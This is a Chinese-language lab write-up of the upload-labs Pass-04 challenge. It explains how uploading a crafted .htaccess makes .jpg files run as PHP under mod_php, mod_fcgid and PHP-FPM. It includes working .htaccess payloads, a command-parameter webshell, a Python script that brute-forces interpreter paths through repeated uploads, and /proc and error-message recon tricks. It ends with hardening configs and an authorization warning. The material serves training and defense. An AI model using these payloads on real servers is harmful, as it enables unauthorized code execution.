# .htaccess 上传绕过与 PHP 环境探测

> 来源：upload-labs Pass-04 实战 + 本机（phpStudy Pro / Apache 2.4.39 / mod_fcgid / PHP 5.2.17）实测
> 整理日期：2026-10-17
> 本文所有结论均为**本机实测**，不是抄来的。三种写法我都跑过，结果差异很大。

---

## 目录

- [一、.htaccess 是什么](#一htaccess-是什么)
- [二、Pass-04 为什么能用这招](#二pass-04-为什么能用这招)
- [三、它凭什么能生效：AllowOverride](#三它凭什么能生效allowoverride)
- [四、三种部署方式，三种写法 ⭐](#四三种部署方式三种写法-)
- [五、判断决策树：看返回什么就知道下一步 ⭐](#五判断决策树看返回什么就知道下一步-)
- [六、本机实测记录](#六本机实测记录)
- [七、五个常见踩坑](#七五个常见踩坑)
- [八、完整攻击链](#八完整攻击链)
- [九、如何找 mod_fcgid 的程序路径](#九如何找-mod_fcgid-的程序路径)
- [十、关联知识点：.user.ini](#十关联知识点userini)
- [十一、防御方案](#十一防御方案)
- [十二、授权提醒](#十二授权提醒)

---

## 一、.htaccess 是什么

`.htaccess` 是 **Apache 独有的"目录级配置文件"**。

你在某个目录里放一个 `.htaccess`，Apache 处理这个目录下的请求时就会**读取并应用**里面的指令 —— 相当于**把服务器配置的一部分下放到了目录里**。

这是虚拟主机时代的产物：共享主机不让用户改主配置，就用 `.htaccess` 给用户一点自主权。

### 它能干什么

| 能力 | 指令 | 攻击者怎么滥用 |
|---|---|---|
| 改 MIME 类型 | `AddType` | 让 `.jpg` 被当 PHP 解析 |
| 改处理器 | `AddHandler` / `SetHandler` | 同上（FastCGI 环境用） |
| 指定用哪个程序跑 | `FcgidWrapper` | 配合上面那个 |
| URL 重写 | `RewriteRule` | 劫持流量、绕过访问控制 |
| 设默认首页 | `DirectoryIndex` | 做后门入口 |
| 自动包含文件 | `php_value auto_prepend_file` | 让同目录所有 PHP 先执行你的代码 |
| 密码保护 | `AuthType` | — |

### 关键限制

| 限制 | 说明 |
|---|---|
| **只有 Apache 认** | **nginx 和 IIS 完全不读 `.htaccess`** —— 这是最容易踩的坑 |
| 文件名必须**严格**是 `.htaccess` | 全小写、前面一个点、没有主文件名。`x.htaccess`、`.HTACCESS` 都不算 |
| 受 `AllowOverride` 限制 | 设成 `None` 就完全失效（Apache 默认值就是 None） |

---

## 二、Pass-04 为什么能用这招

源码的判定逻辑是**取最后一个点之后的部分**当扩展名：

```php
$file_name = trim($_FILES['upload_file']['name']);
$file_name = deldot($file_name);              // 删除文件名末尾的点
$file_ext  = strrchr($file_name, '.');        // 取最后一个点及之后
$file_ext  = strtolower($file_ext);
$file_ext  = str_ireplace('::$DATA', '', $file_ext);
$file_ext  = trim($file_ext);

if (!in_array($file_ext, $deny_ext)) { ... }   // 黑名单判断
```

黑名单（Pass-04 第 11 行）覆盖了：`.php .php1~.php5 .phtml .pht .html .htm .jsp* .asp* .cer .swf .ini` 等等，**但没有 `.htaccess`**。

| 上传的文件名 | 取出的"扩展名" | 黑名单里有吗 | 结果 |
|---|---|---|---|
| `horse.php` | `.php` | ✓ 有 | 拦 |
| `horse.php3` | `.php3` | ✓ 有 | 拦 |
| **`.htaccess`** | **`.htaccess`** | **✗ 没有** | **放行** |
| `horse.htaccess` | `.htaccess` | ✗ 没有 | 放行（但无效，见坑 1） |
| `.user.ini` | `.ini` | **✓ 有** | **拦** |
| `horse.php7` | `.php7` | ✗ 没有 | 放行 |

### 为什么开发者会漏掉它

开发者写黑名单时脑子里想的是"禁止 php/jsp/asp 这类**脚本扩展名**"。

**`strrchr('.htaccess', '.')` 返回的就是 `.htaccess` 整个字符串** —— 因为 `.htaccess` 自己就是个"以点开头的文件名"，没有第二个点。开发者**压根没想到会有这种"整个文件名就是配置名"的东西**。

> 💡 **顺便排除一个常见误解**：`.user.ini` 在 Pass-04 **不行** —— 它取出来的扩展名是 `.ini`，而 `.ini` 恰好在黑名单里。
> `.user.ini` 那一招要留给别的靶场（黑名单里没写 `.ini` 的）用。

---

## 三、它凭什么能生效：AllowOverride

`.htaccess` 能否起作用，**完全取决于 `<Directory>` 块里的 `AllowOverride`**：

```apache
<Directory "E:/phpstudy/phpstudy_pro/WWW">
    AllowOverride All          ← 允许 .htaccess 覆盖一切
</Directory>
```

| `AllowOverride` 的值 | `.htaccess` 效果 |
|---|---|
| `None`（Apache **默认值**） | **完全忽略**，文件放了也没用 |
| `All` | 所有指令都生效 |
| `FileInfo` | 只允许改 MIME/handler/rewrite 类指令（**攻击最需要的就这几个**） |
| `Options` | 只允许 `Options` |

**phpStudy / XAMPP / WAMP 这类集成环境为了方便用户，通常默认 `AllowOverride All`** —— 这就是靶场能做这关、也是真实环境常见风险点的原因。

**快速验证目标是否允许 `.htaccess`**（不用攻击，只测机制）：

上传一个内容如下的 `.htaccess`：

```apache
AddType text/x-test .zzz
```

再放一个 `probe.zzz`，访问后看响应头：

```
Content-Type: text/x-test      ← 生效了
Content-Type: application/octet-stream   ← 没生效
```

---

## 四、三种部署方式，三种写法 ⭐

**这是本文最核心的一节。** 网上 90% 的 writeup 只写了第一种，但在 FastCGI 环境下它会直接失效。

### 4.1 Apache + mod_php（最常见）

PHP 作为 Apache 的模块运行。**这种写法零路径依赖**：

```apache
AddType application/x-httpd-php .jpg
```

或：

```apache
SetHandler application/x-httpd-php
```

原理：`application/x-httpd-php` 是 mod_php 注册的**处理器名**，`AddType` 把 `.jpg` 的 MIME 映射到它，Apache 就交给 mod_php 执行。

> ⚠️ 这是**教科书答案**，但**不是所有环境都适用**。

### 4.2 Apache + mod_fcgid（你本机就是这种）

PHP 以 FastCGI 方式运行。**必须两条指令，缺一不可**：

```apache
AddHandler fcgid-script .jpg
FcgidWrapper "E:/phpstudy/phpstudy_pro/Extensions/php/php5.2.17nts/php-cgi.exe -c E:/phpstudy/phpstudy_pro/Extensions/php/php5.2.17nts/php.ini" .jpg
```

- 第 ① 条：把 `.jpg` 交给 `fcgid-script` 这个**处理器**
- 第 ② 条：告诉 mod_fcgid，处理 `.jpg` 时用**哪个可执行程序**
- `-c` 指定 php.ini（不写的话会去读服务器级 `PHPRC` 指向的 ini，可能版本不匹配）

### 4.3 Apache + PHP-FPM

通过 FastCGI 代理到 FPM 的 socket 或端口：

```apache
# Unix socket
SetHandler "proxy:unix:/run/php/php7.4-fpm.sock|fcgi://localhost"

# TCP
SetHandler "proxy:fcgi://127.0.0.1:9000"
```

需要 `mod_proxy` + `mod_proxy_fcgi`，且 `.htaccess` 里通常还要 `Require` 相关权限。

### 4.4 对照表

| 部署方式 | `.htaccess` 写法 | 需要路径 |
|---|---|---|
| Apache + **mod_php** | `AddType application/x-httpd-php .jpg` | ✗ |
| Apache + **mod_fcgid** | `AddHandler fcgid-script .jpg`<br>`FcgidWrapper "…php-cgi.exe" .jpg` | ✓ |
| Apache + **PHP-FPM** | `SetHandler "proxy:unix:/path/fpm.sock\|fcgi://localhost"` | ✓ |
| **nginx** | **此路不通**（不读 .htaccess） | — |

---

## 五、判断决策树：看返回什么就知道下一步 ⭐

上传 `.htaccess` + `shell.jpg` 后，访问 `shell.jpg`，**看返回什么就能判断该改什么**：

```
访问 shell.jpg
    │
    ├─ 看到 <?php 源码 ──────→ .htaccess 没生效
    │                          · 文件名不是严格 .htaccess？
    │                          · AllowOverride 是 None？
    │                          · handler 名字写错？（比如 AddType 用在 FastCGI 上）
    │                          → 换指令写法
    │
    ├─ HTTP 500 ────────────→ AddHandler 匹配上了，但 FcgidWrapper 没配上
    │                          ① 压根没写 FcgidWrapper？
    │                          ② 写了，但扩展名大小写对不上？
    │                             （请求 .JPG ≠ wrapper 里的 .jpg）
    │                          → 两个都要查，查完才去找路径
    │
    └─ 返回执行结果 ─────────→ ✓ 成功，通关
```

**记住这个信号**：**看到 500 说明 `.htaccess` 已经生效了**，问题只出在"用哪个程序执行"这一层 ——
要么没写 `FcgidWrapper`，要么大小写对不上，要么路径不对。**按这个顺序查，不要盲目猜。**

### 为什么"缺 FcgidWrapper"会 500 而不是报错

因为 Apache 知道"这个文件要交给 fcgid-script 处理器"，但 mod_fcgid 查表发现**这个扩展名没有注册可执行程序** → 内部错误 → 500。

> 💡 **同一个规律在别的地方也会遇到**：upload-labs Pass-06 上传 `.PHP` 返回 500，也是这个原因 —— `AddHandler fcgid-script .php` **大小写不敏感地**匹配到了 `.PHP`，但 `FcgidWrapper` 的扩展名映射**是大小写敏感的**，没有 `.PHP` 的 wrapper → 500。

---

## 六、本机实测记录

环境：Windows 11 + phpStudy Pro + Apache 2.4.39 + **mod_fcgid** + PHP 5.2.17

三种写法在同一个靶场（upload-labs Pass-04）上的实测结果：

| 测试 | `.htaccess` 内容 | 访问 `shell.jpg` | 原因 |
|---|---|---|---|
| **A** | `AddType application/x-httpd-php .jpg` | ✗ **静态返回源码** | 没有 mod_php，这个处理器**根本不存在** |
| **B** | `AddHandler fcgid-script .jpg` | ✗ **HTTP 500** | 处理器找到了，但 mod_fcgid 不知道该用哪个程序跑 |
| **C** | `AddHandler fcgid-script .jpg`<br>`FcgidWrapper "…php-cgi.exe -c …php.ini" .jpg` | **★★ 执行成功** | 两条都齐了 ✓ |
| **D** | 同 C，但木马文件名是 `shell.**JPG**`（大写） | ✗ **HTTP 500** | `AddHandler` 大小写不敏感匹配上了，`FcgidWrapper` 却只认小写 → 见坑 5 |
| **E** | 在 C 基础上补一条 `FcgidWrapper "…" .JPG` | **★★ 执行成功** | 大小写补齐后 `shell.JPG` 也能执行 ✓ |

**结论：教科书答案（A）在 FastCGI 环境下 100% 失效。** 必须先判断目标用哪种部署方式。

### 附加观察

`.htaccess` 一旦生效，**该目录下所有 `.jpg` 都会变成可执行** —— 包括之前上传的、看起来是图片的文件。

而且删除 `.htaccess` 后立刻恢复原状（变回静态文件），说明这套机制**完全由 `.htaccess` 驱动**，不留痕迹。

---

## 七、五个常见踩坑

### 坑 1：文件名必须严格是 `.htaccess`

```diff
- horse.htaccess      ← Apache 不认识，当普通文件忽略了
+ .htaccess           ← ✓ 唯一正确的名字
```

**最容易犯的错**：为了让文件能上传（有些关卡会检查扩展名），把文件命名成 `xxx.htaccess` —— 这样虽然能过检查，但 **Apache 不会读它**。

> **Windows 下创建点开头文件的技巧**：
> 资源管理器「查看」→ 勾上「文件扩展名」，再新建文本文档重命名为 `.htaccess`
> （不勾的话会变成 `.htaccess.txt`）
>
> 或用 PowerShell：
> ```powershell
> Set-Content -Path "$env:USERPROFILE\Desktop\.htaccess" -Value 'AddHandler fcgid-script .jpg' -Encoding ASCII
> Add-Content -Path "$env:USERPROFILE\Desktop\.htaccess" -Value 'FcgidWrapper "E:/phpstudy/.../php-cgi.exe" .jpg'
> ```

### 坑 2：`AddHandler` 语法写错

```diff
- AddHandler shell.jpg                    ← 错：只有一个参数
+ AddHandler fcgid-script .jpg            ← 对：处理器名 + 扩展名
```

`AddHandler` 的语法是：

```
AddHandler 处理器名 扩展名 [扩展名...]
```

写 `AddHandler shell.jpg` 会被解析成"处理器名叫 `shell.jpg`、**没指定任何扩展名**" —— 等于什么都没做。

### 坑 3：在 FastCGI 环境用了 `AddType`

见第六节测试 A。**必须根据部署方式选指令。**

### 坑 4：只写 `AddHandler` 不写 `FcgidWrapper`

见第六节测试 B —— 返回 500。

**两条指令的关系**：

```
① AddHandler fcgid-script .jpg
   "凡是以 .jpg 结尾的，交给【fcgid-script】这个处理器"
        ↓
② FcgidWrapper "…/php-cgi.exe" .jpg
   "fcgid-script 处理器在处理 .jpg 时，用【php-cgi.exe】这个程序"
        ↓
PHP 执行 shell.jpg
```

缺 ① → 当静态文件返回源码
缺 ② → 500

### 坑 5：扩展名大小写不匹配 ⭐ 最隐蔽、最难自查

**这是实际踩过、卡了很久的一个坑。** 真实案例（upload-labs Pass-04 实测）：

```
.htaccess 里写的是：  AddHandler fcgid-script .jpg
                      FcgidWrapper "…php-cgi.exe" .jpg        ← 全小写

木马文件却叫：         shell.JPG                                ← 大写
```

**结果：HTTP 500，从报错里完全看不出哪里错。**

| 文件 | HTTP | 结果 |
|---|---|---|
| `shell.**JPG**` | **500** | ✗ `AddHandler` 匹配上了，但 `FcgidWrapper` 没配对 |
| `shell.**jpg**`（内容完全相同） | 200 | **★ `?c=whoami` → `拯救者\q拯救者`** |

#### 根本原因：两条指令的大小写敏感性不一样

| 指令 | 大小写敏感？ | 说明 |
|---|---|---|
| `AddHandler fcgid-script .jpg` | **不敏感** | `.JPG` 也会被交给 fcgid 处理器 |
| `FcgidWrapper "…" .jpg` | **敏感** | 只认 `.jpg`，`.JPG` 找不到对应程序 |

**一个不敏感 + 一个敏感 = Apache 把请求交出去了，mod_fcgid 却找不到程序 → 500。**

#### 修法 A：把木马文件名改成小写（推荐）

```
shell.JPG  →  shell.jpg
```

最省事，已验证小写版直接执行成功。

#### 修法 B：在 `.htaccess` 里补齐大小写变体

```apache
AddHandler fcgid-script .jpg                    # ← 这行不用改，本来就大小写不敏感
FcgidWrapper "…php-cgi.exe -c …php.ini" .jpg
FcgidWrapper "…php-cgi.exe -c …php.ini" .JPG    # ← 只补这一条就够
```

> 实测：补上 `.JPG` 后，`shell.JPG` 立刻变成 **HTTP 200 执行成功** ✓

#### 🔗 这和 upload-labs Pass-06 是**同一个坑**

Pass-06 上传 `.PHP` 返回 500，原因完全一样：

```apache
AddHandler fcgid-script .php     # 大小写不敏感 → .PHP 也匹配上了
FcgidWrapper "…" .php            # 大小写敏感  → 没有 .PHP 的 wrapper → 500
```

**把这条规律刻进脑子**：

> 在 Apache + FastCGI 环境里，看到 **500** + 想不通为什么 + 用了自定义/非标准扩展名，
> **第一反应就该是"`AddHandler` 和 `FcgidWrapper` 的扩展名大小写对得上吗？"**

---

### `.htaccess` 自查清单（6 项）

上传后如果没反应，按顺序过一遍：

| # | 检查项 | 常见错误 | 自查方法 |
|---|---|---|---|
| 1 | 文件名**严格**是 `.htaccess` | 写成 `x.htaccess`（Apache 完全不认） | `dir /a` 看文件列表 |
| 2 | **无 BOM** | 记事本存成「UTF-8 with BOM」→ 第一行解析失败 | 看文件前 3 字节是不是 `EF BB BF` |
| 3 | 指令**语法**对 | `AddHandler shell.jpg`（缺处理器名） | 对照第四节写法 |
| 4 | **扩展名大小写匹配** | `.JPG` 请求 vs `.jpg` wrapper | 见坑 5 |
| 5 | 路径用**正斜杠** `/` | 写成 `E:\phpstudy\…` | — |
| 6 | 命令整体有**引号**包裹 | 路径含空格时没引号会截断 | — |

一条命令做完 1、2、3 三项检查：

```powershell
$f = 'E:\phpstudy\phpstudy_pro\WWW\upload-labs-master\upload\.htaccess'
$b = [IO.File]::ReadAllBytes($f)
Write-Output "大小: $($b.Length) 字节"
Write-Output "BOM : $(if($b.Length -ge 3 -and $b[0] -eq 0xEF -and $b[1] -eq 0xBB -and $b[2] -eq 0xBF){'⚠ 有 BOM，会导致 Apache 解析失败！'}else{'✓ 无'})"
Write-Output "内容:"
[Text.Encoding]::UTF8.GetString($b) -split "`r?`n" | Where-Object { $_ } | ForEach-Object { Write-Output "  $_" }
```

---

## 八、完整攻击链

### 第 1 步：判断目标环境

先按第五节的决策树，**从零路径依赖的写法开始试**：

```
① AddType application/x-httpd-php .jpg      ← mod_php 环境直接就过了
    ↓ 失败
② 试 .php7 / .phtml 之类扩展名绕过             ← 黑名单不全的话直接就过了
    ↓ 还是不行
③ 才考虑 AddHandler + FcgidWrapper（需要找路径）
```

### 第 2 步：上传 `.htaccess`

用靶场的上传接口上传，内容（本机是 FastCGI，所以用这套）：

```apache
AddHandler fcgid-script .jpg
FcgidWrapper "E:/phpstudy/phpstudy_pro/Extensions/php/php5.2.17nts/php-cgi.exe -c E:/phpstudy/phpstudy_pro/Extensions/php/php5.2.17nts/php.ini" .jpg
```

### 第 3 步：上传木马，扩展名改成 `.jpg`

```php
<?php echo 'PWNED'; ?>
```

存成 `horse.jpg` 上传 → 关卡检查 `.jpg` 通过 ✓

### 第 4 步：访问

```
http://localhost/upload-labs-master/upload/horse.jpg
```

如果你的马有参数（比如 `system($_GET['c'])`），就加参数：`?c=whoami`

---

## 九、如何找 mod_fcgid 的程序路径

### 9.1 先想清楚：真的需要吗？

**大部分情况下不需要。** 见第四节对照表 —— 只有确认对方是 `mod_fcgid` 或 `PHP-FPM` 时才需要路径。

看到 **500** 才是明确信号。

### 9.2 六种探测手法

#### 🥇 手法 1：`/proc/self/cmdline`（Linux 专属，最准）

```bash
cat /proc/self/cmdline | tr '\0' ' '; echo
```

直接输出 PHP 进程的**完整启动命令**：

```
/usr/bin/php-cgi -c /etc/php/7.4/cgi/php.ini
```

→ wrapper 路径 = `/usr/bin/php-cgi`

还可以看：

```bash
cat /proc/self/environ | tr '\0' '\n'    # 环境变量
ls -l /proc/self/exe                     # 可执行文件软链
cat /proc/1/cmdline | tr '\0' ' '        # 父进程
```

#### 🥈 手法 2：`php_ini_loaded_file()`（跨平台，输出短）

```php
<?php
echo 'php.ini : ', php_ini_loaded_file(), "\n";
echo 'ext_dir : ', ini_get('extension_dir'), "\n";
echo 'doc_root: ', $_SERVER['DOCUMENT_ROOT'], "\n";
echo 'script  : ', $_SERVER['SCRIPT_FILENAME'], "\n";
echo 'sapi    : ', php_sapi_name(), "\n";
```

实测输出（本机）：

```
php.ini : E:\phpstudy\phpstudy_pro\Extensions\php\php5.2.17nts\php.ini
ext_dir : E:\phpstudy\phpstudy_pro\Extensions\php\php5.2.17nts\ext
doc_root: E:/phpstudy/phpstudy_pro/WWW
script  : E:/phpstudy/phpstudy_pro/WWW/upload-labs-master/upload/x.php
sapi    : cgi-fcgi
```

**`php-cgi.exe` 就在 `php.ini` 同一个目录里** → 路径直接推出来。

> 比 `phpinfo()` 好的地方：**输出短、不用翻页、不容易被 WAF 关键词拦。**

#### 🥉 手法 3：制造 Warning，从报错里读路径

```php
<?php system(''); ?>            // → Warning 带当前脚本的绝对路径
<?php include 'nonexist'; ?>    // → Warning 带路径
```

实测输出（本机）：

```
Warning: system() [function.system]: Cannot execute a blank command in
    E:\phpstudy\phpstudy_pro\WWW\upload-labs-master\upload\shell.jpg on line 5
```

> ⚠️ **注意错误级别**：`E_NOTICE`（比如未定义变量）**默认可能不显示**。
> 要用 `E_WARNING` 级别的问题才容易漏路径 —— 我试过 `$undefined_array['x']['y']`，什么都没输出，就是这个原因。

#### 手法 4：猜常见默认路径

集成环境的路径高度固定，直接列表试：

| 环境 | `php-cgi` 常见位置 |
|---|---|
| **phpStudy (旧版)** | `C:/phpstudy/PHPTutorial/php/php-7.2.1-nts/php-cgi.exe` |
| **phpStudy Pro** | `D:/phpstudy_pro/Extensions/php/php7.3.4nts/php-cgi.exe` |
| **XAMPP** | `C:/xampp/php/php-cgi.exe` |
| **WAMP** | `C:/wamp64/bin/php/php7.4.33/php-cgi.exe` |
| **phpEnv** | `C:/phpEnv/php/php-7.4/php-cgi.exe` |
| **Debian/Ubuntu** | `/usr/bin/php-cgi`、`/usr/lib/cgi-bin/php` |
| **CentOS/RHEL** | `/usr/bin/php-cgi` |
| **宝塔面板** | `/www/server/php/74/bin/php-cgi` |
| **cPanel** | `/usr/local/cpanel/3rdparty/bin/php-cgi` |

#### 手法 5：盲爆破（一次试一批）

把候选路径一个个写进 `.htaccess` 上传，每次传完访问木马看是否执行：

```python
import requests

BASE = "http://目标/upload-labs-master"
CANDIDATES = [
    r"C:/phpstudy/PHPTutorial/php/php-7.2.1-nts/php-cgi.exe",
    r"C:/xampp/php/php-cgi.exe",
    r"/usr/bin/php-cgi",
    r"/usr/lib/cgi-bin/php",
    r"/www/server/php/74/bin/php-cgi",
]

def upload(name, content):
    requests.post(f"{BASE}/Pass-04/",
                  files={'upload_file': (name, content)},
                  data={'submit': '上传'})

for p in CANDIDATES:
    upload('.htaccess', f'AddHandler fcgid-script .jpg\nFcgidWrapper "{p}" .jpg\n')
    upload('shell.jpg', '<?php echo "HIT"; ?>')
    r = requests.get(f"{BASE}/upload/shell.jpg")
    if "HIT" in r.text and "<?php" not in r.text:
        print(f"[+] 命中! wrapper 路径 = {p}")
        break
    print(f"[-] 失败: {p}")
```

> 每次都要**重新上传 `.htaccess` 覆盖**上一次的（同名会覆盖 ✓）。

#### 手法 6：其他信息泄露点

| 泄露源 | 能拿到什么 |
|---|---|
| `phpinfo.php` / `test.php`（遗留探测文件） | 全部信息 |
| 404 / 500 错误页 | 有些框架显示完整路径 |
| `/.git/config` | 部署路径线索 |
| `/server-status` | Apache 运行配置 |
| `xxx.php.bak` / `xxx.php~` | 源码里的 `include` 绝对路径 |
| `composer.json` / `package.json` | 有时含路径 |

---

## 十、关联知识点：`.user.ini`

Apache 环境用 `.htaccess`，**nginx / PHP-CGI 环境用 `.user.ini`**：

```ini
auto_prepend_file=shell.jpg
```

放在某个目录里，该目录下**所有 PHP 文件执行前都会先包含 `shell.jpg`** —— 相当于把图片马"激活"了。

**前提**：
1. 黑名单没过滤 `.user.ini`（注意它在 Pass-04 **是**被过滤的）
2. PHP 以 CGI/FastCGI 方式运行（`.user.ini` 是 CGI 特性，mod_php 不读）
3. `user_ini.filename` 没被禁用

**和 `.htaccess` 的对比**：

| | `.htaccess` | `.user.ini` |
|---|---|---|
| 生效环境 | Apache | PHP-CGI / FastCGI |
| nginx 下 | ✗ 不读 | ✓ 可以用 |
| 作用 | 改 handler，让任意扩展名执行 | 让图片马被自动包含 |
| 需要重启 | 不需要 | **有缓存**（`user_ini.cache_ttl` 默认 300 秒） |

---

## 十一、防御方案

| 层面 | 措施 | 有效性 |
|---|---|---|
| 应用层：黑名单加 `.htaccess` | 治标不治本，还有 `.user.ini`、`.php7`…… | ★★ |
| **应用层：改用白名单 + 自己生成文件名** | 白名单天然免疫这类问题 | ★★★★ |
| **服务器层：`AllowOverride None`** | 直接让 `.htaccess` 失效，最省事 | ★★★★ |
| **目录层：上传目录禁止执行脚本** ⭐ | **釜底抽薪，所有绕过手法全部失效** | ★★★★★ |

### 完整的 vhost 加固写法

```apache
<Directory "/var/www/uploads">
    # ① 让 .htaccess 彻底失效
    AllowOverride None

    # ② 关掉 CGI
    Options -ExecCGI -Indexes

    # ③ mod_php 下直接关掉 PHP
    php_admin_flag engine off
    php_admin_value auto_prepend_file none

    # ④ FastCGI/FPM 下移除所有 PHP handler
    RemoveHandler .php .php2 .php3 .php4 .php5 .php7 .phtml .pht
    RemoveType    .php .php2 .php3 .php4 .php5 .php7 .phtml .pht
</Directory>
```

nginx 下对应写法：

```nginx
location ^~ /upload/ {
    location ~ \.(php|php[0-9]|phtml|pht)$ {
        deny all;
    }
}
```

> **核心思想**：只要**上传目录不能执行任何脚本**，`.htaccess` 也好、`.php7` 也好、图片马也好 —— **全部失效**。
> 这也是为什么真实部署里，上传目录和网站程序目录必须分开。

---

## 十二、授权提醒

本文所有技术**仅用于自己搭建的靶场、或明确授权的渗透测试**。

- 本地靶场（如你自己搭的 upload-labs）→ ✓ 没问题
- 公共在线演示站（专门给人练手的）→ 看清站点说明，一般可以
- **任何没有书面授权的真实系统 → 违法**

技术本身中立，边界在于**你有没有得到许可**。

---

*本文基于本机实际测试编写，所有"实测"字样后的结果均为真实抓取。*
